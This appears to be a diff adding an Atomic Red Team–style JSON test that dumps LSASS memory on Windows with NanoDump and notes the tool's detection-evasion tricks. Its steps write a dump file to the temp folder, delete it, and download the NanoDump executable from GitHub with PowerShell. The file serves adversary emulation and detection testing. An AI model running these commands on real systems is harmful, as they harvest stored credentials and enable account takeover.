@@ -1,0 +1,97 @@
+{
+  "id": "dddd4aca-bbed-46f0-984d-e4c5971c51ea",
+  "name": "Dump LSASS.exe Memory using NanoDump",
+  "description": "The NanoDump tool uses syscalls and an invalid dump signature to avoid detection.\n\nhttps://github.com/helpsystems/nanodump\n\nUpon successful execution, you should find the nanondump.dmp file in the temp directory\n",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "9475ca3c-ee9d-4271-bc03-48748c33de53",
+      "type": "execute-command",
+      "data": {
+        "command": "PathToAtomicsFolder\\..\\ExternalPayloads\\nanodump.x64.exe -w \"%temp%\\nanodump.dmp\"\n",
+        "command_type": "command_prompt"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "3c99dcb5-f0b3-4b60-a722-0ce8d7f9e039",
+      "type": "execute-command",
+      "data": {
+        "command": "del \"%temp%\\nanodump.dmp\" \u003enul 2\u003e nul\n",
+        "command_type": "command_prompt"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "27b71113-3a52-4d24-a603-8d8832d61be2",
+      "name": "Check dependency 1/1",
+      "description": "NanoDump executable must exist on disk at specified location (PathToAtomicsFolder\\..\\ExternalPayloads\\nanodump.x64.exe)\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if (Test-Path PathToAtomicsFolder\\..\\ExternalPayloads\\nanodump.x64.exe) {exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "f256aa2e-64a7-42ba-b71d-1681fe7bf739",
+      "name": "Resolve dependency 1/1",
+      "description": "NanoDump executable must exist on disk at specified location (PathToAtomicsFolder\\..\\ExternalPayloads\\nanodump.x64.exe)\n",
+      "type": "execute-command",
+      "data": {
+        "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nNew-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://github.com/fortra/nanodump/blob/2c0b3d5d59c56714312131de9665defb98551c27/dist/nanodump.x64.exe\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\nanodump.x64.exe\" \n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "157cae42-f14b-468c-8529-a7f063cbe300",
+      "name": "Re-check dependency 1/1",
+      "description": "NanoDump executable must exist on disk at specified location (PathToAtomicsFolder\\..\\ExternalPayloads\\nanodump.x64.exe)\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if (Test-Path PathToAtomicsFolder\\..\\ExternalPayloads\\nanodump.x64.exe) {exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "9475ca3c-ee9d-4271-bc03-48748c33de53",
+      "p": "on-success",
+      "o": "3c99dcb5-f0b3-4b60-a722-0ce8d7f9e039"
+    },
+    {
+      "s": "9475ca3c-ee9d-4271-bc03-48748c33de53",
+      "p": "on-failure",
+      "o": "3c99dcb5-f0b3-4b60-a722-0ce8d7f9e039"
+    },
+    {
+      "s": "27b71113-3a52-4d24-a603-8d8832d61be2",
+      "p": "on-success",
+      "o": "9475ca3c-ee9d-4271-bc03-48748c33de53"
+    },
+    {
+      "s": "27b71113-3a52-4d24-a603-8d8832d61be2",
+      "p": "on-failure",
+      "o": "f256aa2e-64a7-42ba-b71d-1681fe7bf739"
+    },
+    {
+      "s": "f256aa2e-64a7-42ba-b71d-1681fe7bf739",
+      "p": "on-success",
+      "o": "157cae42-f14b-468c-8529-a7f063cbe300"
+    },
+    {
+      "s": "157cae42-f14b-468c-8529-a7f063cbe300",
+      "p": "on-failure",
+      "o": "9475ca3c-ee9d-4271-bc03-48748c33de53"
+    }
+  ],
+  "tags": [
+    "T1003.001",
+    "atomic-red-team"
+  ]
+}
